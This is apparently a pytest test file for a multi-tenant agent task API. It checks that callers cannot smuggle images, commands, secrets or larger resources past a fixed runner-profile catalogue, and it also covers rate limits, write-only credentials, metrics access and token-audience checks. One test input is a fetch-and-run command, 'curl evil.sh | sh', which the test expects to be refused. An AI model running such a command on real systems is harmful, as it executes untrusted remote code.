"""Submission guards and the catalogue boundary.

Invariant 10 is the one with teeth: an authenticated caller must not be able to
turn the swarm into arbitrary compute. They name a `runner_profile` and the
frozen catalogue supplies everything else. These tests try to smuggle an image,
a command, a backend and a resource spec past the schema.
"""

from __future__ import annotations

import pytest

from swarm_common.profiles import RESOURCE_CLASSES, RUNNER_PROFILES

from swarm_api.errors import ValidationFailed
from swarm_api.validation import (
    validate_resource_class_override,
    validate_runner_profile,
    validate_timeout,
)

from .conftest import auth_header, seed_pool


def submit(client, user: str, **body):
    payload = {"runner_profile": "mock", "input": {}}
    payload.update(body)
    return client.post("/v1/tasks", headers=auth_header(user), json=payload)


# -- the catalogue boundary ------------------------------------------------

@pytest.mark.parametrize(
    "field,value",
    [
        ("image", "evil/image:latest"),
        ("command", ["bash", "-c", "curl evil.sh | sh"]),
        ("backend", "GKE_AUTOPILOT"),
        ("cpu", 64),
        ("memory_gib", 512),
        ("service_account", "someone-elses-sa@project.iam.gserviceaccount.com"),
        ("secrets", ["ANTHROPIC_API_KEY"]),
        ("env", {"ANTHROPIC_API_KEY": "sk-stolen"}),
        ("spot", True),
        ("node_selector", {"cloud.google.com/gke-spot": "true"}),
    ],
)
def test_execution_parameters_from_a_caller_are_refused(client, field, value):
    response = submit(client, "alice", **{field: value})
    assert response.status_code == 422, f"{field} was not refused"
    body = response.json()
    assert field in body["message"], body
    assert "runner_profile" in body["message"]


def test_unknown_runner_profile_is_rejected(client):
    response = submit(client, "alice", runner_profile="definitely-not-real")
    assert response.status_code == 422
    body = response.json()
    assert body["code"] == "validation_failed"
    # THE SUGGESTION LIST IS WHAT YOU CAN SEND, not what exists. It used to be
    # the whole catalogue, which meant a caller who mistyped was handed a list
    # containing `codex` -- a profile that is refused on submit for a different
    # reason. A suggestion you would also refuse is not a suggestion.
    assert set(body["detail"]["known_runner_profiles"]) == {
        n for n, p in RUNNER_PROFILES.items() if p.available
    }
    assert "codex" not in body["detail"]["known_runner_profiles"]


def test_a_disabled_profile_is_refused_as_disabled_not_as_unknown(client):
    """`codex` is spelled correctly and the platform will not run it.

    Collapsing this into "unknown runner_profile" sends a caller hunting for a
    typo that is not there. The reason is the only part they can act on: on
    2026-09-23 four codex steps of a twenty-step run failed with "openai
    refused the credential", and the platform was focused on Claude.
    """
    response = submit(client, "alice", runner_profile="codex")
    assert response.status_code == 422
    body = response.json()
    detail = body["detail"]
    assert detail["disabled"] is True
    assert detail["runner_profile"] == "codex"
    assert detail["reason"], "a disabled profile must say why"
    assert "unknown" not in body["message"].lower(), (
        "a known-but-refused profile must not be reported as unknown"
    )


def test_claude_code_is_available(client):
    """The counterpart. Disabling one profile must not disable the platform."""
    assert submit(client, "alice", runner_profile="claude-code").status_code in (200, 201)


def test_the_profile_decides_the_resource_class_and_provider(client, db):
    seed = submit(client, "alice", runner_profile="mock").json()["task"]
    profile = RUNNER_PROFILES["mock"]
    assert seed["resource_class"] == profile.resource_class
    assert seed["provider"] == profile.provider
    # And the stored document agrees; nothing was taken from the request.
    assert db.docs[f"tasks/{seed['id']}"]["resource_class"] == profile.resource_class


def test_a_step_cannot_upgrade_itself_to_a_bigger_resource_class():
    small = RUNNER_PROFILES["mock"]            # standard
    with pytest.raises(ValidationFailed) as exc:
        validate_resource_class_override(small, "large")
    assert "larger than runner_profile" in str(exc.value)
    # Same size or smaller is fine.
    assert validate_resource_class_override(small, "standard") == "standard"


def test_unknown_resource_class_is_rejected():
    with pytest.raises(ValidationFailed) as exc:
        validate_resource_class_override(RUNNER_PROFILES["mock"], "enormous")
    assert set(exc.value.detail["known_resource_classes"]) == set(RESOURCE_CLASSES)


def test_timeout_can_be_shortened_but_not_lengthened():
    profile = RUNNER_PROFILES["mock"]
    assert validate_timeout(profile, None) == profile.timeout_seconds
    assert validate_timeout(profile, 60) == 60
    assert validate_timeout(profile, 999_999) == profile.timeout_seconds


def test_validate_runner_profile_returns_the_frozen_entry():
    assert validate_runner_profile("browser") is RUNNER_PROFILES["browser"]


# -- size and rate guards --------------------------------------------------

def test_batch_size_guard(client, api_context):
    limit = api_context.settings.core.max_batch_size
    ok = client.post(
        "/v1/tasks/batch",
        headers=auth_header("alice"),
        json={"tasks": [{"runner_profile": "mock"} for _ in range(limit)]},
    )
    assert ok.status_code == 201
    assert ok.json()["count"] == limit

    too_many = client.post(
        "/v1/tasks/batch",
        headers=auth_header("alice"),
        json={"tasks": [{"runner_profile": "mock"} for _ in range(limit + 1)]},
    )
    assert too_many.status_code == 422
    assert too_many.json()["detail"]["max_batch_size"] == limit


def test_input_size_guard(client, api_context):
    limit = api_context.settings.core.max_input_bytes
    response = submit(client, "alice", input={"blob": "x" * (limit + 1)})
    assert response.status_code == 422
    assert response.json()["detail"]["max_bytes"] == limit


def test_workflow_step_limit(client, api_context):
    limit = api_context.settings.core.max_workflow_steps
    response = client.post(
        "/v1/workflows",
        headers=auth_header("alice"),
        json={
            "steps": [
                {"step_id": f"s{i}", "runner_profile": "mock"} for i in range(limit + 1)
            ]
        },
    )
    assert response.status_code == 422
    assert response.json()["detail"]["max_workflow_steps"] == limit


def test_rate_limit_is_per_principal(db, tokens, group_map):
    from fastapi.testclient import TestClient

    from swarm_api.auth import StaticTokenVerifier
    from swarm_api.credentials import InMemoryCredentials
    from swarm_api.deps import build_context
    from swarm_api.groups import StaticGroups
    from swarm_api.main import create_app
    from swarm_api.waker import NullWaker

    from .conftest import api_settings, core_settings

    ctx = build_context(
        settings=api_settings(core=core_settings(requests_per_second=1), rate_limit_burst=3),
        db=db,
        verifier=StaticTokenVerifier(tokens),
        groups=StaticGroups(group_map),
        credentials=InMemoryCredentials(),
        waker=NullWaker(),
    )
    client = TestClient(create_app(ctx), raise_server_exceptions=False)

    statuses = [client.get("/v1/stats", headers=auth_header("alice")).status_code for _ in range(6)]
    assert 429 in statuses, statuses

    limited = client.get("/v1/stats", headers=auth_header("alice"))
    assert limited.status_code == 429
    assert "Retry-After" in limited.headers
    # A different principal has its own bucket and is unaffected.
    assert client.get("/v1/stats", headers=auth_header("bob")).status_code == 200


# -- credentials are write-only -------------------------------------------

def test_credential_is_stored_bound_to_the_tenant_and_never_returned(client, api_context):
    response = client.post(
        "/v1/tenants/me/credentials",
        headers=auth_header("alice"),
        json={"provider": "anthropic", "api_key": "sk-ant-super-secret-value"},
    )
    assert response.status_code == 201, response.text
    body = response.json()
    assert "sk-ant-super-secret-value" not in response.text
    assert body["credential"]["secret_id"] == "swarm-tenant-eng-anthropic"
    assert body["credential"]["accessor_service_account"].startswith(
        "swarm-agent-worker-eng@"
    )

    # No read path returns it.
    me = client.get("/v1/tenants/me", headers=auth_header("alice"))
    assert me.json()["tenant"]["credentials"] == ["anthropic"]
    assert "sk-ant-super-secret-value" not in me.text

    providers = client.get("/v1/providers", headers=auth_header("alice"))
    assert "sk-ant-super-secret-value" not in providers.text
    entry = next(p for p in providers.json()["providers"] if p["provider"] == "anthropic")
    assert entry["credential_registered"] is True


def test_unknown_provider_cannot_be_registered(client):
    response = client.post(
        "/v1/tenants/me/credentials",
        headers=auth_header("alice"),
        json={"provider": "not-a-provider", "api_key": "x" * 20},
    )
    assert response.status_code == 422
    assert "anthropic" in response.json()["detail"]["known_providers"]


def test_a_profile_needing_an_unregistered_provider_parks_rather_than_running(
    client, db, make_scheduler, dispatcher
):
    """Parked by ADMISSION, before any lease, not by the API at submission.

    The API used to decide this itself, with a copy of the rule that knew
    nothing about the account pool (#169). It now writes READY, which costs
    nothing (invariant 1), and the scheduler's one statement of the rule
    (scheduler/credentials.py) parks it: this deployment has no pool, so a
    missing key is simply a missing key.
    """
    task = submit(client, "alice", runner_profile="claude-code").json()["task"]
    assert task["state"] == "READY"

    seed_pool(db, "global", hard_limit=10)
    make_scheduler().drain()

    assert db.docs[f"tasks/{task['id']}"]["state"] == "PARKED"
    assert db.docs[f"tasks/{task['id']}"]["park_reason"] == "CREDENTIAL_MISSING"
    assert dispatcher.dispatched == []
    assert db.docs["pools/global"]["active"] == 0


def test_registering_the_key_makes_new_submissions_ready(client):
    client.post(
        "/v1/tenants/me/credentials",
        headers=auth_header("alice"),
        json={"provider": "anthropic", "api_key": "sk-ant-" + "y" * 20},
    )
    task = submit(client, "alice", runner_profile="claude-code").json()["task"]
    assert task["state"] == "READY"


# -- health and metrics ----------------------------------------------------

def test_liveness_and_readiness_need_no_token(client):
    assert client.get("/healthz").status_code == 200
    assert client.get("/readyz").status_code == 200


def test_metrics_is_not_readable_by_another_tenant(client):
    """/metrics carries per-tenant labels and every tenant group is an invoker.

    Unauthenticated, it let any member of `research` read `eng`'s submission
    volume, workflow counts, which providers `eng` holds keys for, and the full
    list of tenant ids -- cross-tenant business intelligence and a tenant
    enumeration oracle on a service every tenant can call.
    """
    submit(client, "alice")

    assert client.get("/metrics").status_code == 401
    assert client.get("/metrics", headers=auth_header("bob")).status_code == 403


def test_metrics_count_submissions(client):
    submit(client, "alice")
    metrics = client.get("/metrics", headers=auth_header("root"))
    assert metrics.status_code == 200
    assert "swarm_api_requests_total" in metrics.text
    body = metrics.text
    assert 'swarm_api_tasks_submitted_total{runner_profile="mock",tenant="eng"}' in body


# -- cancellation ----------------------------------------------------------

def test_cancel_of_an_idle_task_is_immediate(client, db):
    task = submit(client, "alice").json()["task"]
    response = client.post(f"/v1/tasks/{task['id']}/cancel", headers=auth_header("alice"))
    assert response.status_code == 200
    assert response.json()["released_immediately"] is True
    assert db.docs[f"tasks/{task['id']}"]["state"] == "CANCELLED"


def test_cancel_of_a_running_task_only_sets_the_flag(client, db):
    task = submit(client, "alice").json()["task"]
    # Simulate the scheduler having admitted and started it.
    db.docs[f"tasks/{task['id']}"]["state"] = "RUNNING"

    response = client.post(f"/v1/tasks/{task['id']}/cancel", headers=auth_header("alice"))
    assert response.status_code == 200
    assert response.json()["released_immediately"] is False
    stored = db.docs[f"tasks/{task['id']}"]
    assert stored["cancel_requested"] is True
    # Still RUNNING: releasing the lease from here would free a slot a live
    # container still occupies.
    assert stored["state"] == "RUNNING"


def test_cancelling_a_terminal_task_is_a_conflict(client, db):
    task = submit(client, "alice").json()["task"]
    db.docs[f"tasks/{task['id']}"]["state"] = "SUCCEEDED"
    response = client.post(f"/v1/tasks/{task['id']}/cancel", headers=auth_header("alice"))
    assert response.status_code == 409


# -- pagination ------------------------------------------------------------

def test_listing_pages_without_dropping_or_repeating_a_task(client):
    """Every task appears exactly once across the pages.

    The page token is a `created_at` cursor rather than a Firestore cursor
    token, so the risk it carries is a collapsed page boundary: a task silently
    skipped, or one returned twice. Walking the whole list a page at a time is
    the only way to see that.
    """
    submitted = []
    for _ in range(7):
        response = submit(client, "alice")
        assert response.status_code == 201
        submitted.append(response.json()["task"]["id"])

    seen: list[str] = []
    token = None
    for _ in range(10):                       # bounded, so a bad token cannot hang
        query = "/v1/tasks?limit=2" + (f"&page_token={token}" if token else "")
        page = client.get(query, headers=auth_header("alice")).json()
        seen.extend(t["id"] for t in page["tasks"])
        token = page["next_page_token"]
        if not token:
            break

    assert token is None, "pagination never terminated"
    assert sorted(seen) == sorted(submitted)
    assert len(seen) == len(set(seen)), "a task was returned on two pages"


def test_a_malformed_page_token_is_a_validation_error_not_a_404(client):
    """404 would tell a caller their own tasks had disappeared."""
    response = client.get(
        "/v1/tasks?page_token=this-is-not-a-cursor", headers=auth_header("alice")
    )
    assert response.status_code == 422
    assert response.json()["code"] == "validation_failed"


# -- the token audience is checked, or the process does not start ----------

def test_the_verifier_refuses_an_unpinned_audience_outside_local_development():
    """`verify_oauth2_token` SKIPS the `aud` claim entirely when the audience is
    None, so with API_AUDIENCE unset any Google ID token belonging to an
    allowed-domain account authenticates -- including one an unrelated
    third-party SaaS obtained when an employee signed in with Google, which it
    could then replay here as that employee. Nothing about a service running
    with the check off looks wrong, so it is refused at start."""
    from swarm_api.auth import GoogleTokenVerifier

    GoogleTokenVerifier("")                                   # local development
    GoogleTokenVerifier("https://api.example", require_audience=True)

    with pytest.raises(ValueError) as exc:
        GoogleTokenVerifier("", require_audience=True)
    assert "API_AUDIENCE" in str(exc.value)


def test_the_app_requires_an_audience_when_the_environment_is_not_local(db):
    from swarm_api.deps import build_context

    from .conftest import api_settings, core_settings

    assert api_settings(core=core_settings(environment="test")).hardened is False
    assert api_settings(core=core_settings(environment="prod")).hardened is True

    with pytest.raises(ValueError) as exc:
        build_context(settings=api_settings(core=core_settings(environment="prod")), db=db)
    assert "API_AUDIENCE" in str(exc.value)


def test_require_auth_false_is_refused_rather_than_silently_ignored(monkeypatch):
    """It was parsed and then read by nothing, so it looked like a working
    switch in .env.example and docker-compose.yml. Nothing in this build can
    serve an unauthenticated request."""
    from swarm_api.settings import ApiSettings

    monkeypatch.setenv("PROJECT_ID", "saga-agents-staging")
    monkeypatch.setenv("REQUIRE_AUTH", "false")
    with pytest.raises(ValueError) as exc:
        ApiSettings.from_env()
    assert "REQUIRE_AUTH" in str(exc.value)

    monkeypatch.setenv("REQUIRE_AUTH", "true")
    assert ApiSettings.from_env().project_id == "saga-agents-staging"


# -- a tenant record is a reference, not a provisioning act ----------------

def test_a_self_service_tenant_points_at_the_names_provisioning_uses(client, db):
    """`ensure_tenant` creates a Firestore document and a slot pool, and no
    Google service account, secret, bucket condition or namespace. The strings
    it writes must therefore be derived by the SAME rule the provisioning uses,
    or they name infrastructure that does not exist."""
    submit(client, "carol")
    stored = db.docs["tenants/u-carol"]
    assert stored["service_account"] == (
        "swarm-agent-worker-u-carol@saga-agents-staging.iam.gserviceaccount.com"
    )
    assert stored["namespace"] == "swarm-tenant-u-carol"
    assert stored["gcs_prefix"].endswith("/tenants/u-carol")


def test_a_tenant_id_too_long_for_a_service_account_gets_no_guessed_one():
    """Google caps a service account id at 30 characters, and provisioning
    truncates to fit. A name the API derived by concatenation would silently
    point at a DIFFERENT tenant's identity as soon as two ids shared a prefix."""
    from swarm_api.store import derived_service_account

    short = derived_service_account("eng", project_id="p")
    assert short == "swarm-agent-worker-eng@p.iam.gserviceaccount.com"

    assert derived_service_account("a" * 12, project_id="p") is None, (
        "31 characters: refused rather than truncated into a collision"
    )


def test_work_for_a_tenant_with_no_identity_never_starts_a_container(db, make_scheduler):
    """It returns to READY with a clear error instead of running as whatever
    identity the backend falls back to."""
    from .conftest import seed_pool, seed_task, seed_tenant

    seed_tenant(db, "eng", max_active=5)
    db.docs["tenants/eng"]["service_account"] = None
    seed_pool(db, "global", hard_limit=5)
    seed_task(db, task_id="task_homeless", tenant_id="eng")

    from scheduler.dispatch import BackendRouter, CloudRunJobDispatcher
    from scheduler.loop import Scheduler
    from scheduler.metrics import SchedulerMetrics
    from scheduler.store import SchedulerStore

    from .conftest import scheduler_settings

    settings = scheduler_settings()
    scheduler = Scheduler(
        settings=settings,
        store=SchedulerStore(db),
        router=BackendRouter(
            cloud_run=CloudRunJobDispatcher(settings, client=object()),
            gke=None,
            settings=settings,
        ),
        metrics=SchedulerMetrics(),
    )
    report = scheduler.drain()

    assert report.dispatch_failures == 1
    assert db.docs["tasks/task_homeless"]["state"] == "READY"
    assert db.docs["pools/global"]["active"] == 0
    assert db.docs["tasks/task_homeless"]["last_error"].startswith(
        "tenant_identity_missing"
    )


def test_the_schemas_module_exposes_no_unwired_request_model():
    """`NamedLimitRequest` read as a planned endpoint that was never wired,
    which makes a reviewer assume a route exists."""
    from swarm_api import schemas

    assert not hasattr(schemas, "NamedLimitRequest")


def test_an_override_may_not_grow_any_dimension_including_disk():
    """The stated guarantee is "no larger ... in every dimension"; disk was not
    compared. Not exploitable with the current three-class catalogue, where disk
    rises with cpu and memory, but a fourth class with a big disk and a small
    CPU would walk straight through the gap."""
    from dataclasses import replace

    from swarm_common.profiles import ResourceClass

    profile = RUNNER_PROFILES["mock"]
    base = RESOURCE_CLASSES[profile.resource_class]
    fat_disk = ResourceClass(
        "archive", cpu=base.cpu, memory_gib=base.memory_gib,
        disk_gib=base.disk_gib * 10, units=base.units,
    )
    RESOURCE_CLASSES["archive"] = fat_disk
    try:
        with pytest.raises(ValidationFailed) as exc:
            validate_resource_class_override(profile, "archive")
        assert exc.value.detail["larger_in"] == ["disk_gib"]
    finally:
        del RESOURCE_CLASSES["archive"]
    assert replace(base, name=base.name) == base       # the catalogue is untouched
